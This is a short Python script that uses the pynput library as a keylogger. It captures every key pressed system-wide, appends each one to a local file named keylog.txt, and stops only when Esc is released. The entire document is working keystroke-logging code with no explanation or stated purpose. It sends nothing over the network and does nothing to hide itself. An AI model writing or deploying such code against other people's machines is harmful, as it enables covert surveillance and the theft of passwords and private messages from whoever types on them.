import pynput
from pynput.keyboard import Listener, Key

def log_key(key):
    with open("keylog.txt","a") as f:
        f.write(str(key) + "\n")
        
def on_release(key): 
    if key == Key.esc:
        return False
    
def main():
    with Listener(on_press=log_key, on_release=on_release) as listener:
         listener.join()
         
if __name__ == "__main__":
    main()
